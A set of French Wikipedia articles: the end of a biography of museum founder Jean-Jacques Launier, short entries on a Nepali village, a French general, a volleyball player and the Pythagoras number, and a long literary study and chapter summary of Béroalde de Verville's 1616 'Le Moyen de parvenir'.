En 2004, Jean-Jacques Launier participe à la création de l’exposition Miyazaki-Moebius au musée de la Monnaie de Paris. Il crée ensuite d'autres expositions en France notamment sur l’art de l’Âge de Glace à Annecy, ainsi que l’art du Seigneur des Anneaux à La Baule-Escoublac. Il a également écrit un roman, "La Mémoire de l’âme", dont chaque page est illustrée d’un dessin de Moebius (éditions Anne Carrière-Stardom, 2001). Il est aussi avec Jean-Samuel Kriegk le co-auteur du livre "Art ludique" (Éditions Sonatine, 2011), et a réalisé un documentaire intitulé "Derrière le masque des super-héros", où intervient notamment Stan Lee.
En 2013, il fonde et préside Art ludique – Le Musée, à Paris, musée consacré à l’Entertainment, inauguré en novembre avec l’exposition « Pixar 25 ans d’animations », et qui accueille en l’exposition « L’Art des Super-Héros Marvel », dont il est également commissaire. La même année, il participe à la création du "Disney Art Challenge", concours destiné à l'ensemble des écoles d'animation françaises, offrant des bourses d'études aux étudiants lauréats. Il en est depuis membre du jury, sous la présidence de John Lasseter. 
En , Jean-Jacques Launier est nommé pour deux ans à la tête de la commission du Fonds d'aide au jeu vidéo du Centre National du Cinéma et de l’Image Animée par la directrice de l’institution, Frédérique Bredin.
En 2015, Jean-Jacques Launier est le commissaire de l'exposition « Aardman, l'Art qui prend forme » puis de « L'Art dans le Jeu vidéo : l'Inspiration française », toutes deux présentées successivement à Art ludique - Le Musée.
Il est également en mars 2016 commissaire de l’exposition « L’Art du studio Blue Sky », conçue par l’équipe d’Art ludique-Le Musée en étroite collaboration avec les artistes et réalisateurs du studio.
En , Jean-Jacques Launier est nommé au grade de Chevalier de l’ordre des Arts et des Lettres par arrêté du .
Il est commissaire de l'exposition « L'Art des studios d'animation Walt Disney - Le Mouvement par nature » qui a débuté le , conçue et écrite par l’équipe du Musée Art ludique en collaboration avec la Walt Disney Animation Research Library. 
Depuis le , Jean-Jacques Launier est commissaire de l'exposition « L'Art de DC : l'Aube des Super-Héros » en collaboration avec DC Entertainment et avec la participation de Warner Bros Consumer Products.
Il est le commissaire de l’exposition « L'épopée artistique de la trilogie "Dragons" » qui a lieu à partir du , en collaboration avec le studio DreamWorks Animation et Universal Pictures International France. 
En 2020, il est commissaire de l'exposition dédiée aux « 25 ans de DreamWorks Animation » qui est organisée mi-octobre à Paris, puis au musée Voltaire (Ferney-Voltaire) en juin 2021 et à Saint Quentin en juin 2022. La même année, il intègre le palmarès des « 50 Français qui feront le jeu vidéo en 2021 » établi par le Gaming Campus . Il intègre de nouveau ce palmarès aux côtés de Diane Launier en 2022 et 2023.
Avec Diane Launier, il est commissaire de l’exposition « Pinocchio de Guillermo Del Toro », qui présente les authentiques sculptures articulées ainsi qu’une sélection inédite de dessins et peintures de recherches pour le film. Créée en collaboration avec Netflix, l’exposition est présentée à Paris entre mi-octobre et mi-décembre 2022. En mars 2023, le film remporte l’Oscar du meilleur film d’animation.
De juin 2023 à Janvier 2024, il présente avec Diane Launier l’exposition « Sur les traces de Tolkien et de l'imaginaire médiéval. Peintures et dessins de John Howe » dont ils sont commissaires d’exposition, et qu’ils ont imaginée et écrite pour le Fonds Hélène &amp; Édouard Leclerc à Landerneau. Conçue en étroite collaboration avec l’artiste John Howe, l’exposition présente en première mondiale près de 300 dessins et peintures de l’artiste, ainsi que des œuvres authentiques (tapisseries, armures, sculptures), prêtées par les musées du Louvre, des Invalides, de Quimper, de Cluny, et d’Orsay.
En 2024, Jean-Jacques et Diane Launier, pour célébrer les 20 ans de l’Art Ludique, conçoivent et écrivent, avec la collaboration de 86 artistes internationaux du jeu vidéo, de l’animation, du cinéma et de la BD, un "Artbook for the Next Generations" dans lequel chaque artiste propose une œuvre accompagnée d’un texte pour évoquer son travail et transmettre aux prochaines générations ses espoirs, ses rêves ou ses inquiétudes. L'ouvrage est publié en 2025.
L'art ludique.
Avec le livre "Art ludique", qu'il coécrit en 2011 avec Jean-Samuel Kriegk, Jean-Jacques Launier se pose comme l'un des principaux théoriciens d'un courant qu'il dépeint comme "un mouvement d'art contemporain issu de différentes formes de divertissement". Avec l'art ludique, Jean-Jacques Launier souhaite mettre en valeur des œuvres d’art issues de l’Entertainment, soit la bande dessinée, le jeu vidéo, le cinéma ou le manga, longtemps jugées indignes car associées au monde de l’enfance ou de l’adolescence et envisagées essentiellement sous un aspect économique et partant incompatible avec la portée artistique. En fondant le musée Art Ludique en 2013, Jean-Jacques Launier a pour aspiration de rendre ses lettres de noblesse aux arts contemporains que sont la bande dessinée, le jeu vidéo et l’animation. 
Jean-Jacques Launier estime ainsi que « l’idée originelle de l’art ludique réside dans le fait que la genèse commune de chaque film, album de bande dessinée ou jeu vidéo est toujours le dessin ». Le mouvement ainsi dépeint rassemble les œuvres de créateurs qui ont marqué l’imaginaire collectif et influencé la culture du et du , d’Hergé à Stan Lee en passant par Hayao Miyazaki.
Dans cet ouvrage, les auteurs définissent trois bassins culturels, où s'est développé l'art ludique : l’Europe Francophone, le Japon et les États-Unis. C’est en effet dans ces trois zones que s’est d’abord développée la Bande Dessinée (les mangas japonais, les comic-books américains, emmenés par Marvel et DC, et la bande dessinée franco-belge, avec Morris ou Peyo), mais aussi le cinéma (le théâtre optique et le cinématographe sont nés en France) et les jeux vidéo (Ubisoft en France, Atari aux États-Unis, ou Nintendo au Japon). Aujourd’hui toutefois, l’Art ludique s’internationalise toujours davantage, grâce notamment à l’émergence de studios internationaux et à la mondialisation des échanges artistiques.
Le président de l'université d'Avignon et sociologue de la culture, Emmanuel Éthis, évoque à plusieurs reprises, sur son "socioBlog", l'Art ludique et le musée qui lui est consacré, définissant le courant comme "un art qui parcourt les réseaux symboliques par lesquels notre conscience s'autonomise graduellement".

</doc>
<doc id="7901922" url="https://fr.wikipedia.org/wiki?curid=7901922" title="Dharapani (Surkhet)">
Dharapani (Surkhet)

Dharapani (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901925" url="https://fr.wikipedia.org/wiki?curid=7901925" title="Namco Ltd.">
Namco Ltd.



</doc>
<doc id="7901929" url="https://fr.wikipedia.org/wiki?curid=7901929" title="Jean Fayard (général)">
Jean Fayard (général)

Jean Marie Fayard, né le à Génelard, mort le à Boulogne-Billancourt, est un général français du (général de corps d'armée). Il fut résistant pendant la Seconde Guerre mondiale et combattit également durant la guerre d'Algérie.
Biographie.
Il est élève au lycée de Chalon-sur-Saône puis, au lycée du Parc à Lyon.
De 1930 à 1932, il est élève à l'École spéciale militaire de Saint-Cyr. Il en sort en 1932, comme sous-lieutenant et gravit les échelons comme officier d'artillerie.
Pendant la Seconde Guerre mondiale, il est fait prisonnier, s'évade de son camp en Allemagne et rentre dans la Résistance. Ses actions diverses en tant que résistant lui donnent droit à la médaille de la Résistance française. En 1945, il est commandant.
De 1947 à 1948, il est instructeur à l'École supérieure de guerre. En 1952, il est nommé lieutenant-colonel. Il est attaché au cabinet militaire de Pierre de Chevigné, alors secrétaire d'état à la Guerre.
De 1955 à 1957, il est colonel et chef de corps du régiment d'infanterie basé alors au Maroc ; il participe aux opérations d'évacuation de ce régiment du Maroc, devenu indépendant officiellement en 1956.
Il travaille à l'État-major de l'Armée de Terre de 1957 à 1960.
Promu général de brigade en 1960, il est affecté à l'Institut des hautes études de Défense nationale.
De 1961 à 1963, pendant la guerre d'Algérie, il est détaché auprès du général commandant le corps d'armée d'Oran, le général de Pouilly. Il commande la division d'infanterie motorisée et dirige la zone militaire de l'Est-Oranais.
Promu général de division en 1963, il est, jusqu'en 1967, général adjoint au Gouverneur militaire de Paris.
Il termine son parcours comme général de corps d'armée, en 1968, commandant la Région militaire à Lille.
De 1972 à 1982, il assure la présidence nationale du Souvenir français.

</doc>
<doc id="7901931" url="https://fr.wikipedia.org/wiki?curid=7901931" title="Aleksandr Rodionov (volley-ball)">
Aleksandr Rodionov (volley-ball)

Aleksandr Aleksandrovitch Rodionov est un joueur russe de volley-ball né le à Gorki (oblast de Nijni Novgorod, alors en URSS). Il mesure et joue central.

</doc>
<doc id="7901932" url="https://fr.wikipedia.org/wiki?curid=7901932" title="Nombre de Pythagore">
Nombre de Pythagore

En algèbre, le nombre de Pythagore d'un corps commutatif "F" est le plus petit entier naturel "p" tel que (dans "F") toute somme finie de carrés soit somme de "p" carrés, si de tels entiers "p" existent, et l'infini sinon. On le note "p"("F"). Le corps "F" est dit pythagoricien si "p"("F") = 1, c'est-à-dire si (dans "F") toute somme de carrés est un carré.

</doc>
<doc id="7901933" url="https://fr.wikipedia.org/wiki?curid=7901933" title="Dharapani">
Dharapani

Dharapani peut faire référence à :

</doc>
<doc id="7901934" url="https://fr.wikipedia.org/wiki?curid=7901934" title="Le Moyen de parvenir">
Le Moyen de parvenir

Le Moyen de parvenir est un récit de banquet écrit par François Béroalde de Verville et publié en 1616. 
La Monnoye, dans sa "Dissertation", décrit en ces mots l'ouvrage : 
« L'auteur y suppose une espèce de festin général, où, sans conséquence pour les rangs, il introduit des gens de toute condition et de tout siècle, sçavans la plupart, qui, n'étant là que pour se divertir, causent de tout en liberté et par des liaisons imperceptibles passant d'une matière à une autre font ces contes à perte de vue ».
Cette analyse nous montre d'emblée l'appartenance du récit au modèle symposiaque. L'hétérogénéité en est amplifiée, en raison de l'exacerbation de paradigmes traditionnels comme le recueil de conte ou le dialogue des morts. Michel Jeanneret définit dès lors le "Moyen de parvenir" comme un « archi-banquet » :
« Il caricature les œuvres de notre répertoire, il exacerbe leurs tendances, il en épuise les virtualités, mais sans rupture. C'est un tourbillon, une débauche, la délirante apothéose d'une forme vouée à l'expérience et à l'excès ».
Présentation de l'auteur et de l'œuvre.
François Béroalde de Verville, de son vrai nom François Brouard, est né à Paris en 1556 dans une famille protestante et marquée par l'humanisme. En raison des guerres de religion, il s'exilera à Genève de 1572 à 1578 pour y étudier la médecine. Il publie ses premières œuvres dès 1584, avant de s'installer à Tours en 1589, où il abjurera sa foi réformée et deviendra chanoine. Connu pour son érudition aussi prolifique qu'hétéroclite, il compose une œuvre aussi bigarrée que poymorphe, du roman allégorique "(Les Avantures de Floride, Le Voyage des Princes Fortunez, La Pucelle d'Orléans)" aux poèmes "(les soupirs amoureux, l'Idée de la République)", en passant par des traités de morale "(Les Appréhensions spirituelles)", sans oublier des mélanges "(Le Cabinet de Minerve, Le Palais des curieux)". "Le Moyen de parvenir", tout en reprenant des lieux communs tels que la satire religieuse, fait figure de texte excentrique. Elle reflète l'inquiétude d'un finissant, désenchanté par le traumatisme des guerres de religion, la dégradation de l'ordre social et religieux, la désagrégation du savoir traditionnel. Le pullulement de l'information depuis la naissance de l'imprimerie entraîne un sentiment de doute que Montaigne affirmera dans ses "Essais". Cependant, cette inquiétude a pour corollaire une extraordinaire vitalité littéraire, sous des formes les plus chaotiques. Par sa bigarrure et sa truculence, le Moyen de parvenir incarne le foisonnement d'une Renaissance crépusculaire.
L'édition "princeps" est apparemment datée de 1616, et fut publiée par Anne Sauvage à Paris. "Le Palais des curieux", paru en 1612, contient une allusion oblique au Moyen de parvenir : « Cependant je vous avise que comme icy je donne des atteintes à plusieurs fautes, que j'ay fait un œuvre lequel est une satire universelle, où je reprends les vices de chacun : Je pensois vous le faire voir soubs un titre qui est tel, le Moyen de parvenir, mais on me l'a vollé, si que pour en avoir le plaisir vous attendrez encore. »
Ce jeu engagé avec le lecteur potentiel annonce d'emblée la portée subversive de l'œuvre. Par ailleurs la critique a connu des incertitudes quant à la paternité de l'œuvre. Toutefois, cette mention laisse à penser que le livre aurait été au moins en projet à cette date. 
La première édition datée dont nous disposons remonte à 1698, et le titre de l'ouvrage avait été modifié : "Le Coupecu de la melancolie ou Venus en belle humeur". On dénombre aujourd'hui une cinquantaine d'éditions. L'exemplaire de Marseille est sans doute la plus ancienne édition connue.
Le Moyen de parvenir et la question de l'obscénité.
Dans son ouvrage "" , Joan Dejean réfléchit à l'émergence du terme moderne d'« obscénité », tel qu'il est conceptualisé au , en lien avec la censure et l'expansion de la production de textes imprimés. Selon elle, c'est la naissance de la censure organisée qui va amener la société à codifier dans l'espace littéraire ce qui est considéré comme une « obscénité » au sens moderne. Auparavant, il n'aurait pas existé de concept régulateur désignant la littérature transgressive. L'obscénité avait alors une connotation exclusivement morale et religieuse. Le développement de l'imprimerie va conduire à une plus large diffusion des ouvrages « obscènes », qui acquièrent une pleine publicité. Accédant dès lors à de nouveaux publics (notamment féminins), ils transforment les codes sociaux de l'indécence et nécessitent la prise en compte par les autorités d'un phénomène littéraire connaissant une activité croissante. L'obscénité n'a de raison d'être qu'à partir du moment où la littérature sexuellement transgressive conquiert une pleine publicité. Paradoxalement, c'est la constitution d'une censure étatique qui aurait permis aux auteurs libertins d'accéder à un statut d'auteur. 
La démarche de Verville, qui se situe à la jonction entre deux époques, catalyse un grand nombre d'interrogations tournant autour du bas corporel. "Le Moyen de parvenir" incarne la transition vers une notion nouvelle de l'obscénité en tant que phénomène littéraire. 
Ainsi, contrairement à Théophile de Viau ou encore Molière au , l'obscénité ne s'accompagnera pas d'une conquête d'un statut d'auteur. 
Un ouvrage à la jonction de deux époques : entre licence carnavalesque et transgression anti-classique..
"Le Moyen de parvenir" paraît dans un contexte de grandes mutations sociale et intellectuelle. Le finissant, le progrès intellectuel et l'impact des guerres de Religion laisse un sentiment d'inconstance et de doute. Par son excentricité, "le Moyen de parvenir" témoigne de ce scepticisme au travers d'une satire généralisée. Il s'agit de représenter une humanité régie par l'instinct sexuel et la mécanique des plaisirs. "Le Moyen" s'inscrit ainsi au carrefour de deux époques : dans l'héritage du comique carnavalesque porté à son apogée par Rabelais, le tabou jeté sur le langage obscène est alors moins étouffant qu'à l'âge classique.
Toutefois, publié à l'aube du , il s'inscrit dans un mouvement d'expansion de la diffusion des ouvrages en langue vernaculaire. Joan DeJean présente ce phénomène comme le facteur principal d'émergence du concept moderne d'obscénité : 
"Le Moyen de parvenir" témoigne d'une ambition totalisante à l'égard de la langue tout autant que de la tradition licencieuse. Face à une inflation de l'information depuis un siècle où l'imprimerie diffuse plus largement les écrits, le désir de témoigner et d'archiver la culture s'avère manifeste. Le récit constitue ainsi une expérimentation paroxystique inégalée. À une époque où la censure n'est pas organisée de façon séculaire et bureaucratique, l'atmosphère littéraire semble davantage propice à l'élaboration d'un microcosme littéraire régi exclusivement par la mécanique pulsionnelle. Il constitue ainsi une sorte de foyer universel des propos de tables et autres anecdotes gauloises. Tandis que la littérature classique tend à faire disparaître les parlers marginaux, Verville mime le parler populaire.
"Le Moyen" paraît au moment où s'étend l'influence de la réforme malherbienne. À partir du moment où le discours sur la sexualité est passé sous silence par la régulation la décence linguistique, on assistera à une reconfiguration de l'obscène : à la duplicité du langage corrupteur, le classicisme oppose une réponse claire et univoque. La censure n'étant pas encore instituée, les processus de régulations n'agiront pas immédiatement au détriment de l'ouvrage. La licence du Moyen est donc à interpréter dans un contexte de résistance au rigorisme croissant auquel s'opposeront les libertins par la liberté des idées et celle des mœurs (en témoignent les polémiques inhérentes au procès de Théophile). 
Le langage deviendrait ainsi une matière vivante, comblant l'écart entre le mot et la chose. Il se mettrait ainsi au service de la verve et du plaisir organique procuré par la découverte de ses anecdotes truculentes.
« Parler du cul » : une rhétorique transgressive.
Le Moyen de parvenir déploie une fantaisie linguistique étonnante quant à la dénomination du bas corporel. Celle-ci témoigne d'un refus de la censure, et constitue une affirmation frontale de la licence du propos comme principe générateur du récit. Il est fait mention à plusieurs reprises de l'ambition proposée dans le Moyen : « parler du cul ». « Ce seroit belle chose de parler du cul, ce seroit un langage excellent. »
Ainsi, le projet de Béroalde se trouve défini en deux points. D'une part, il s'agit d'abord s'exprimer « par le cul », ce qui revient à remotiver le topos de la lecture comme manducation et digestion. D'autre part, le récit vise à réinjecter dans la langue une matière sexuelle et scatologique dans une proportion inégalée. Ainsi, selon Joan DeJean :
La position de Béroalde est donc également ambiguë. Les éléments transgressifs sont présentés sans détour, ni ellipse typographique. Cela peut s'expliquer par le fait que l'édition du livre imprimé n'était pas encore pleinement réglementée. Ce n'est qu'en 1618 que des édits gouvernementaux vont réglementer le statut d'imprimeur, et impliquer une régulation centrale de l'impression. La censure est à l'époque emprunte du vocabulaire religieux, et peinera à s'en affranchir. La diatrybe du Père François Garasse en 1623 ("La Doctrine curieuse des beaux esprits de ce temps") témoigne de l'influence de la religion sur la censure. Dans le Moyen, la crudité du propos est affirmée de manière frontale, et pour ainsi dire insolente, présentant plus directement le discours obscène que dans certains des écrits libertins ultérieurs. Cependant, l'uniformité du traitement du discours par le bas corporel peut ternir la puissance de provocation du propos, en ce que les anecdotes « salaces » se trouvent noyées dans un flot d'affabulations les plus crues.
Ce climat d'incertitude, mêlé au fourmillement intellectuel de l'époque donne lieu à des expérimentations inédites et inouïes. On note une dimension paroxystique dans l'entreprise de destruction des automatismes de la langue. Celle-ci est au service d'une régénération des anecdotes usées portant sur le corps grotesques, pourtant hantées par la répétition de schémas narratifs identiques. Béroalde procède au maniement d'une langue encore malléable. Il présente une expérimentation des limites de l'obscène, à l'aube d'un siècle où le classicisme va poser extrême rigueur imposée à la langue et à l'écriture. Par le principe burlesque, Béroalde propose un envers qui devient endroit, créant un microcosme où les valeurs sont renversées, et où parler du cul devient un idéal de conversation.
Résumé des chapitres.
(d'après la notice de Paul Lacroix ) Les passages en italique délimitent les récits insérés.
Chapitre.
Cette section satirise les géomètres, les géographes et les chronologues; prépare l’assemblée de ces illustres fous, qui, de section en section, donneront de plus en plus des preuves de leur folie stéganographique. Les interlocuteurs s’engagent à se revoir chez le Bonhomme, pour y faire festin. On Invective contre ceux qui donnent légèrement leur parole. "Guillaume qui fait jurer pour lui. Honnête démenti de Coguereau. Seigneur de paroisse qui ne refuse rien".
Nom.
Satire contre les grammairiens latins, si hérissés ' partout, qu’on ne peut en aborder, sans être sûr d’être déchiré par l’épine; et contre les pindariseurs de la langue françoise. "L’assesseur pindarisant".
Paraphrase.
À l’ajournement chez le Bonhomme, aucun des conviés ne manque, et tous, en entrant dans la salle, se saluent. Satire contre les révérencieux. Description de la salle. Critique de Platon.
Axiome.
Éloge de toute l’assemblée, dans un style si singulier, qu’on ne sait s’il l’injurie ou la loue. Cet éloge est terminé par l’apologie de Madame (la belle inconnue), dont beaucoup de bien est dit.
Songe.
Les ﬂacons de vin étaient au frais. Sortie vigoureuse contre les buveurs d'eau tiède, les sots à table et les timides en conversation. Histoire de la découverte de la vérité au fond d'un puits par Démocrite. Raison pourquoi le vin s’avale plus promptement que le pain. Vin répandu est le plus grand malheur. "Sermon d’un curé. Démocrite qui trouve la vérité dans un puits".
Proposition.
Socrate fut chargé de l’emploi de maître des cérémonies. On y vit arriver Alexandre, revenu de chez les gymnosophistes, Aphtonius, Bodin, Pythagore, Démosthènes, Aristote, Rabelais ; Cusa et Jean Hus se placent. Digression plaisante sur la future destinée de ce livre. L’archidiacre grand gourmand. Moine circonspect au pied de la potence.
Couplet.
Le repas commence. À propos de repas, savante et profonde dissertation sur les pets, et histoire des pets musqués de la belle lmperia avec le gentilhomme de Lierno. "Naissance de Ia Couronne-impériale. De Lierno couche avec la belle courtisane. Naissance des orties."
Sermon.
L’histoire de la belle Marciole, qui ramasse, toute nue, les cerises qu’elle avait apportées au sieur de la Roche. Les plaisirs indiscrètement prisés des regardants, et la somme que la belle emporta, "Marciole ramassant les cerises." "Prudence de l’abbesse de Montmartre".
Coq-à-l’âne.
Chacun, rempli de l'histoire de Marciole, raisonne sur son cela, et pour quoi cela est appelé cela. Plaisanterie d’un médecin visitant une fille malade. "Médecin examinant une malade."
Circoncision.
L’auteur annonce clairement à ses lecteurs la difficulté de lire ce livre, dont toutes les phrases sont cousues par le hasard : l’exemple du bonhomme Guyon, qui mettoit dans une grande terrine tout pèle-mêle ce qu’en lui donnoit à boire et à manger, est une comparaison sensée de cet ouvrage. Analyse d’une dissertation d’un prieur de Vau-de-Vire sur le mot cela. Homme et femme sont honteux de montrer leur cela, selon la petitesse de l’un ou la grandeur de l’autre. Le dialogue d’Hippolyte et de son amant vis-à-vis sa mère mérite l’attention de ceux qui aiment de la chaleur dans les dialogues. "Histoire de M. de la Rose, qui, pour se moquer des notaires, fait passer des pois par-devant eux. Guyon qui mangeait et buvait pèle-mêle. La belle Hippolyte qui se chauffait à la parisienne. Pois passés par-devant notaires".
Pause dernière.
Éloge ambigu des convives, de l’ouvrage, et des lecteurs assez spirituels pour l’ai mer et comprendre. Comparaison de ce volume avec verre et bouteille.
Vidimus.
En continuant l’apologie de ce volume, il l’appelle bréviaire, pour avoir le droit de faire un sarcasme contre les propriétaires de bréviaires. Le conte du bréviaire du curé, et du quiproquo de la femme du libraire, n’est qu’une courte parenthèse à cette apologie, qui n’est interrompue que par une furieuse satire contre les ﬁnanciers et gens pressurant le peuple par la levée des impôts. Embarras dans lequel il entre sur le nom qu'on doit dignement imposer à ce livre; en rejetant le mot de clavicule, il fait un conte sur Rabelais qui pré pare une médecine à "du Bellay" avec une décoction de clefs. il termine cette section par une invective contre les pédants latinistes et les ennuyeux scoliastes. "Le bréviaire du cure, quiproquo de la femme d’un libraire. Médecine apéritive de Rabelais."
Conclusions.
Plaisante conversation d’un principal du collège de Genève et d’un ministre: ou y développe un germe de scepticisme sur les deux religions catholique et protestante. il termine son éloge de ce livre par des idées très burlesques et fort analogues au style dont il est écrit. Guérison du ministre malade.
Corollaire.
Bèze est le premier qui forme l’interlocution dans cet ouvrage; il disserte plaisamment sur les gouvernantes de prêtres, qui le premier jour leur disent votre ; le second, notre, et le troisième, mon. Quelques quiproquos précèdent l’histoire du bachelier fouette; elle est commencée, et tout d’un coup interrompue. "Bonne foi d'un homme près d’être rompu. Gradations de familiarité des chambrières. La tête de veau de l'avocat du Mans. Le bachelier fouetté et fouettant".
Dessein.
L’interruption ayant toujours lieu, à propos de soutanes et braguettes, plaisanteries vives sur les papistes et les huguenots, sur les buveurs d’eau vigoureux champions en amour, et; sur le terme de faire la pauvreté. Enfin le conte du bachelier, fouetté par la dame Laurence et la fouettant à son tour, reprend son fil ; le trépas de la pauvre dame, et; la frayeur de sa jument, à ce triste spectacle de fouetterie.
Homélie.
Propos de sœur Dronice avec son abbesse, qui la réprimande d’avoir tâté du fruit de vie. Raisonnement intéressant à la république, sur l'encouragement qu’on doit donner à celles qui l’enrichissent par des enfants. "Différentes réponses d’enfants sur le cocuage des pères et le putanisme des mères. La nonnain curieuse réprimandée. Réponse naïve d’un enfant à sa mère. Naïveté d'un curé."
Journal.
Continuation des propos sur les femmes, que j’aime mieux qu’on lise que d’en faire l’analyse. Plaisanterie sur l’aventure d’un moine (sans contredit, e’est aventure de paillardise; et toutes les fois que je dirai aventure de moine, cela aura cette signification) et sur l’explication de Thevet tourné en ridicule sur son style et ses bévues. "Grotesque serment d’un paysan égrillard, pour détourner la jalousie bien fondée de son voisin sur son compte, vis-a-vis sa femme. Décision sur les femmes en général. Femme prise pour un boiteau de foin. Frère Jérôme le chimiste. Expression reprise. Plaisant serment de Georget."
Mappemonde.
Explication burlesque d’une vérité trop certaine, qu’il faut graisser la main aux gens de justice. Histoire de frère Jérôme, grand alchimiste, dans laquelle on se moque des brûleurs de charbon et des entrepreneurs de fortunes imaginaires; "frère Jérôme, pour fermer la bouche à sa parente anti chimiste, lui dit qu’il cherche la poudre qui le fait faire sept coups. Façon de graisser les mains de son juge."
Métaphrase.
Un coq-à-l’âne fort court, d’un valet qui explique à sa façon "mundus caro dæmonia", diffère un moment l’histoire de la pierre à casser les œufs. Secret de faire mourir quelqu’un sans qu’il y paroisse; il ne se peut pratiquer qu’en huitaine qui précède le carême. Naïveté d’un valet. Pierre à casser les œufs.
Paragraphe.
Nouvel éloge du livre, dont le résultat est de donner des leçons aux gouvernants superlatifs, pour n’être jamais dupes dans les repas où ils se trouvent.
Occasion.
Dénost le gourmand sert de modèle dans l’apothéose de la gourmandise. loi, la conversation des convives se brouille; et’, par une cascade inattendue, elle rentre dans les quiproquos. Comment faire dans un terrain couvert de neige, pour que les pas d’une pucelle n’y paraissent point? Conte de la ﬁlle du métayer, qui avait perdu un mouton et qui voulait être tuée pour retourner à la maison. Cornu, le modèle des gourmands. Quiproquo d'une femme. La ﬁlle qui veut mourir.
Plumitif.
Secret infaillible pour savoir si une fille est pucelle, pourvu qu’on ne soit ni manchot ni courte-haleine. Manière fort sensée d’annoncer la fête de la Madelaine. Sermon de la Madelaine.
Problème.
Les évêques ni les Chapitres n’ont beau jeu dans cette section ; les uns sont traités comme pharisiens, qui disent de bonnes choses et en font de mauvaises; les autres, comme assemblées de corps sans âme, de matière sans esprit. "Histoire de la ﬁlle reconnaissante qui prend le meilleur, et veut qu’on donne à sa mère le pire : vit-on un meilleur cœur! Sermon sur la charité’. L’achat d'un meilleur outil."
Enseignement.
Histoire du notaire et du beau petit diabolique faucheur; elle est coupée par deux ou trois parenthèses fort plaisantes. Dans l‘une, on y développe bien régulièrement les différentes sortes de bénéﬁces; et ce développement ne peut manquer d’être bon et raisonnable, il est fait par Cicéron. Dans une autre, il y a quelques railleries sur des termes qu’entre gens de religion on se reproche qu’il ne faut jamais prononcer, à moins qu'on ne veuille se voir lapider avec pierres d’églises ou de prêches. Dans la dernière, est une plaisanterie sur un faucheur qui se coupa la tête voulant attraper un poisson avec le bout de la lame de sa faux. "Le pré fauché et le petit faucheur. Maladresse d'un faucheur."
Résultat.
Histoire de M. Jacques de La Tour, autre fois prédicateur, et finalement marchand de lanternes, qui, mourant de faim à en débiter, fit une petite fortune à en vendre. Sortie vigoureuse sur les ubiquitaires. Histoire du petit saint homme, qui devint méchant comme un diable, dès qu’il fut moine. "Le ministre marchand de lanternes. La novice méchant comme un diable."
Livre de raison.
De naïves et simples réponses sont le sujet de cette section, qui est terminée par l’illustre et fameux conte de Robin mon oncle. "sarcasmes contre la vénalité des bénéﬁces et la simonie. stupidité d’un écolier. Le père de Melchisedech. Évêque généreuse comme de raison. Conte de Robin mon oncle."
Parabole.
Pour autoriser son propos sur la simonie, il raconte plaisamment la ﬁnesse d’un jeune bachelier qui voulait avoir un bénéﬁce de messire Imbert. Généalogie très suivie de Melchisedech, quoi qu’on dise le texte sacré, qu’on ne connaît ni son père ni sa mère.
Fen..
Singulière explication du premier vers des distiques de Catou, sur les carmes. "Sœur Jeanne explique fort énergiquement la valeur du mot coquebin. Plaisant remède d’une paysanne pour son pataud de mari. - chapelain châtré d'une Anglaise. Valet qui n’est pas coquebin."
Chapitre général.
Messire Gilles, après avoir passé par l’étamine hypercritique de Scaliger sur son nom et l’origine de son nom, raconte l'histoire du diable châtré. Sentiments de religion bien placés, sur le chagrin qu’on doit avoir que saint Michel n’ait pas tué le diable, quand il avait si beau jeu, puis qu’il était armé comme quatre mille, et que le diable était tout nu. "Le diable Châtré. Nom de sculpteur tronqué plaisamment."
Rencontre.
Naïveté d’une ﬁlle de chambre, qui ne cède en rien à la simplicité d’un prédicateur. Messire Guillaume le Vermeil veut parler à son tour; mais il est représenté comme un homme ivre et qui bégaie. Diogène, dans ce repas, est aussi cynique contre nos porte-chasubles, qu’il l'était dans les rues d’Athènes, tapissé des douves de son tonneau. "Naïveté d’une ﬁlle de chambre. Sermon expressif fait à des Jacobins. Conte de la reine des pois pilés."
Cause.
C’est ici la scène des souhaits; chacun en fait à double entente, plus plaisants les uns que les autres. "Conte de Martine et de sa ﬂûte, pour faire opposition à Bobin et ses ﬂûtes. Satire contre les moines à besace. Plaisant testament d’un Toulousain, en faveur de sa femme, qu’il laissa fort bien pourvue, en ne lui ajoutant rien à ce qu’elle avait auparavant. Sortie contre ces Agnès d’apparence, qui donnent leurs faveurs à des rustres. "Conte des pelotons et de l’honneur cousu et recousu. Martine qui promet une ﬂûte à son mignon. Amphibologie dans le sermon d'un curé. Le testament en faveur d’une femme. Conte des pelotons et de l’honneur cousu. Madeleine la bien fêtée.""
Minute.
Ici, le banquet reprend vigueur; on boit et on mange en toute sûreté. Histoire du farfadet de Poissy. Explication (les termes de petit exercice, de dispense, et de purgatoire.) "Sergent tombé, plaisamment moqué. Question, dont le premier vers de Despautère est la réponse. Dissertation sur le vin, les buveurs et sur l’ivresse. Jaquette du Mas trouve bien heureusement le nom de son ﬁls. Amyot, accusé de vérole. Satire contre l’inquisition d’Espagne. Conte du farfadet de Poing. Chute d'un sergent. Nouvelle d’un paysan d'Orléans. Sermon d'un ministre de Strasbourg. Prudence d'une servante. Nom donné à un enfant par un sermon. Conte sur Amyot et sa vérole. Bon avis d'un fils à sa mère."
Remontrance.
Érasme raconte aux convives l’histoire de don Rodrigue das Yervas. La soupe de Glougourde le fait canoniser à Rennes : c’est une parenthèse au conte de don Rodrigue. Mot à double sens sur l’indifférence d’Érasme pour l’évangile. Sentiments sur les poésies d’Æneas Silvius et de Bèze. Munster, moqué d’avoir voulu être l‘apologiste de Thevet. Bonne raison de l’amour des femmes pour les moines.Cette section est terminée par quelques propos de niaiserie paysanne. "Conte de la soupe de saint Glougourde. Mère d’Erasme, qui oublia son pater. Naïveté d'un berger. Histoire de don Rodrigue das Yervas. Balourdise d’une paysanne."
Généalogie.
invective contre les mœurs et la fourberie des gens du siècle. Scot et Uldric se disent dépouillés; Madame veut les raccommoder. Plaisante façon de faire une déclaration d‘amour. "Chanoine qui veut le bien d'autrui."
Notice.
Les convives se plaignent qu’on ne vient pas au but qu’ils s’étoient proposé. Tout d’un coup, Paracelse commence une belle dissertation sur la première matière, dissertation claire comme un étang bourbeux, ou comme la bouteille à l’encre.
Parlements.
Il continue sa dissertation, et se jette un peu sur la friperie des parvenus, et sur la façon de parvenir dans ce monde de désordre et de dissolution. Plaisant pari d’un domestique.
Verset.
L’histoire de Quenault et de sa serpe est coupée de diverses instructions très-profitables. On y voit la différence d’une femme de par Dieu, d’avec une femme de par le diable. "Sermon du curé de Busançois, divisé en trois points. Le conte de Quenault et de Thibault. Sermon en trois points du curé de Busançois."
